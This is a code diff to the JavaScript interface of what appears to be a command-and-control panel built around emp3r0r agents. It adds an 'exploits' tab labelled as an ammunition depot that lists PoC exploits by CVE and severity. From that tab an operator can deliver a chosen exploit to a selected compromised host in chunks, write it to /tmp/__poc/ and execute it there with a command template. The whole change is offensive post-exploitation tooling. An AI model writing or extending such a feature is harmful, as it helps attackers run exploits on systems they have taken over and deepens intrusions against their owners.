@@ -275,6 +275,7 @@ function switchTab(name) {
   if (name === "sysinfo") { onSysInfoTab(); onSensitiveTab(); }
   if (name === "proc") { procRefresh(); }
   if (name === "plugins") { pluginsRefresh(); }
+  if (name === "exploits") { exploitsRefresh(); }
   if (name === "graph") { graphRefresh(); }
   if (name === "library") { loadLibrary(); }
   if (name === "tunnel") { tunnelLoad(); }
@@ -298,7 +299,7 @@ function switchTab(name) {
 function _updateAgentIndicators() {
   const a = S.selectedAgent;
   const label = a ? `🎯 ${a.hostname || 'unknown'} (${a.privilege || 'user'})` : "";
-  ["tunnel-agent-indicator", "scan-agent-indicator", "upg-agent-indicator", "wsshell-agent-indicator", "files-agent-indicator", "sched-agent-indicator"].forEach(id => {
+  ["tunnel-agent-indicator", "scan-agent-indicator", "upg-agent-indicator", "wsshell-agent-indicator", "files-agent-indicator", "sched-agent-indicator", "exploits-agent-indicator"].forEach(id => {
     const el = document.getElementById(id);
     if (el) el.textContent = label || "No agent selected";
   });
@@ -4396,6 +4397,84 @@ async function pluginRun(id, name) {
   const ok = (d.steps || []).filter(s => !s.error).length;
   out.textContent = `「${d.plugin}」 ${ok}/${(d.steps || []).length} 条成功\n\n` +
     (d.steps || []).map(s => `$ ${s.cmd}  (${s.ms}ms)\n${s.error ? "[!] " + s.error : (s.output || "").slice(0, 3000)}\n`).join("\n");
+}
+
+// ── 弹药库（PoC 仓库投送）──────────────────────────────────────────────────
+let _exploits = [];
+const _SEV_COLOR = { critical: "#e5534b", high: "#d29922", medium: "#3fb9d6", low: "#8b949e" };
+
+async function exploitsRefresh() {
+  const list = document.getElementById("exploits-list");
+  if (!list) return;
+  const d = await _capi("/api/exploits");
+  if (!d) return;
+  _exploits = d.exploits || [];
+  if (!_exploits.length) {
+    list.innerHTML = '<div style="opacity:.55;padding:12px">弹药清单为空（检查 POC_REPO 挂载与 README 表格）</div>';
+    return;
+  }
+  exploitsRender();
+}
+
+function exploitsRender() {
+  const list = document.getElementById("exploits-list");
+  if (!list) return;
+  const q = (document.getElementById("exploits-search")?.value || "").toLowerCase();
+  const rows = _exploits.filter(e =>
+    !q || (e.cve || "").toLowerCase().includes(q) || (e.component || "").toLowerCase().includes(q) ||
+    (e.title || "").toLowerCase().includes(q) || e.dir.toLowerCase().includes(q));
+  if (!rows.length) {
+    list.innerHTML = '<div style="opacity:.55;padding:12px">无匹配条目</div>';
+    return;
+  }
+  list.innerHTML = rows.map(e => {
+    const sev = e.severity ? `<span style="background:${_SEV_COLOR[e.severity] || "#8b949e"}22;color:${_SEV_COLOR[e.severity] || "#8b949e"};border:1px solid ${_SEV_COLOR[e.severity] || "#8b949e"}55;border-radius:4px;padding:1px 6px;font-size:10px">${esc(e.severity)}</span>` : "";
+    const ex = e.exploit
+      ? `${esc(e.exploit)} <span style="opacity:.55">(${(e.exploit_size / 1024).toFixed(1)}KB)</span>`
+      : '<span style="color:#d29922">未找到 exploit 脚本</span>';
+    const cve = e.cve || e.dir;
+    return `
+    <div style="display:flex;align-items:center;gap:12px;padding:10px 14px;background:var(--bg-2);border:1px solid var(--border);border-radius:6px">
+      <div style="flex:1;min-width:0">
+        <div style="font-weight:600;font-size:12px">${esc(cve)} ${sev} <span style="opacity:.6;font-weight:400">${esc(e.component || "")}</span></div>
+        <div style="font-size:11px;opacity:.7;white-space:nowrap;overflow:hidden;text-overflow:ellipsis" title="${esc(e.title || "")}">${esc(e.title || "")}</div>
+        <div style="font-size:10px;opacity:.5;font-family:var(--mono)">${ex} · ${esc(e.dir)}</div>
+      </div>
+      ${e.exploit ? `<button class="btn-primary" style="padding:5px 12px" onclick="exploitDeploy('${esc(e.dir)}')">📥 投送</button>
+      <button class="btn-sm" style="padding:5px 12px" onclick="exploitRun('${esc(e.dir)}')">▶ 投送并执行</button>` : ""}
+    </div>`;
+  }).join("");
+}
+
+function _exploitsShow(text) {
+  const out = document.getElementById("exploits-out");
+  if (!out) return;
+  out.style.display = "block";
+  out.textContent = text;
+}
+
+async function exploitDeploy(dir, runCmd) {
+  const aid = _agentOrToast(); if (!aid) return;
+  const body = { agent_id: aid, poc_dir: dir };
+  if (runCmd) body.run_cmd = runCmd;
+  _exploitsShow(`[*] 投送 ${dir} → ${aid} …（emp3r0r 会话按 4KB 分块，可能需要 1~2 分钟）`);
+  const d = await _capi("/api/exploits/deploy", {
+    method: "POST", headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(body),
+  });
+  if (!d) return;
+  let t = `[+] ${d.poc_dir}/${d.exploit} → ${d.remote_path}（${d.total} 块）`;
+  if (d.command_id) {
+    t += `\n[+] 执行已下发（command_id=${d.command_id}）\n[*] agent 分钟级轮询，输出约 1~2 分钟后可在终端页查看；\n    也可手动核验: ls /tmp/__poc/`;
+  }
+  if (d.run_error) t += `\n[!] 执行下发失败: ${d.run_error}`;
+  _exploitsShow(t);
+}
+
+async function exploitRun(dir) {
+  const tpl = prompt("执行命令模板（{name} = 远端文件路径）：", "python3 {name}");
+  if (tpl === null) return;
+  await exploitDeploy(dir, tpl);
 }
 
 // ── 链路图 ──
